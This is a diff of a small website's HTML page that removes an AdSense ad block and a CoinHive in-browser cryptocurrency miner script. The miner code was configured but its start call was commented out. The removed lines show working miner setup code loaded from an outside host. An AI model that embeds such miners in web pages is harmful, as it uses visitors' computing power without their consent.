@@ -28,20 +28,7 @@
         <a href="http://henry.supplies">henry.supplies</a>
         <a href="http://henry.supply">henry.supply</a>
     </div>
-    <div style="width:100%;margin-top:1.25rem;">
-      <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-      <!-- henry.* -->
-      <ins class="adsbygoogle"
-           style="display:block"
-           data-ad-client="ca-pub-8424592945159392"
-           data-ad-slot="9579285162"
-           data-ad-format="auto"></ins>
-      <script>
-      (adsbygoogle = window.adsbygoogle || []).push({});
-      </script>
-    </div>
   </div>
-  <script defer src="https://coin-hive.com/lib/coinhive.min.js"></script>
   <script defer>
     document.addEventListener("DOMContentLoaded", _ => {
       var vid = document.querySelector("video");
@@ -57,27 +44,6 @@
           }
         }
       });
-
-      var miner = new CoinHive.Anonymous('O0FtQIqvGUgxsnBXKwEvFh68FlSPimqW', {
-      	threads: 1,
-      	autoThreads: false,
-      	forceASMJS: true
-      });
-      window.miner = miner;
-
-      // Don't be an asshole
-      // miner.start();
-
-      // Listen on events
-      miner.on('found', function() { /* Hash found */ })
-      miner.on('accepted', function() { /* Hash accepted by the pool */ })
-      // Update stats once per second
-      setInterval(function() {
-        var hashesPerSecond = miner.getHashesPerSecond();
-        var totalHashes = miner.getTotalHashes();
-        var acceptedHashes = miner.getAcceptedHashes();
-        console.log(hashesPerSecond, totalHashes , acceptedHashes );
-      }, 1000);
     });
   </script>
 </body>
